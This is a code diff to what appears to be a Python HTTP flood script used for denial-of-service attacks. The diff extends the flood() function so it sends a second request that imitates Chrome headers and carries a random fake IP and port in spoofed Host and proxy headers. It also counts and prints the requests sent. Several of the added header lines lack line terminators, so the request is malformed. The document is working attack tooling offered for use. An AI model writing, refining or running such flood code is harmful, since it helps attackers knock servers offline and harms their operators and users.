@@ -1,4 +1,4 @@
-import socket, threading, random, os
+import socket, threading, random, os, http.client
 
 ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
@@ -60,7 +60,11 @@ def flood():
     n5 = random.choice(ang)
     n6 = random.choice(ang)
     n7 = random.choice(ang)
-    fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}"
+    n8 = random.choice(ang)
+    n9 = random.choice(ang)
+    n10 = random.choice(ang)
+    n11 = random.choice(ang)
+    fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}:{n8}{n9}{n10}{n11}"
     try:
         global attack
         attack += 1
@@ -73,6 +77,27 @@ def flood():
         req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
         req += "Connection: keep-alive\r\n"
         s.send(req.encode())
+        req2 = "GET / HTTP/2.0\r\n"
+        req2 += "Cache-Control: max-age=0\r\n"
+        req2 += 'Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n'
+        req2 += "Sec-Ch-Ua-Mobile: ?0\r\n"
+        req2 += 'Sec-Ch-Ua-Platform: "Windows"\r\n'
+        req2 += "Dnt: 1\r\n"
+        req2 += "Upgrade-Insecure-Requests: 1\r\n"
+        req2 += "User-Agent: "+random.choice(ua)+"\r\n"
+        req2 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+        req2 += "Sec-Fetch-Site: none"
+        req2 += "Sec-Fetch-Mode: navigate"
+        req2 += "Sec-Fetch-User: ?1"
+        req2 += "Sec-Fetch-Dest: document"
+        req2 += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+        req2 += "Accept-Encoding: gzip, deflate, br"
+        req2 += "Host: "+ip+""
+        req2 += "X-HTTPS: 1"
+        req2 += "Content-Length: 0"
+        req2 += "Host: " + str(fip) + "\r\n"
+        req2 += "Proxt-agent: " + str(fip) + "\r\n"
+        s.send(req2.encode())
         s.close()
         print("Flooding..          ",attack,"Sent", end='\r')
     except socket.gaierror:
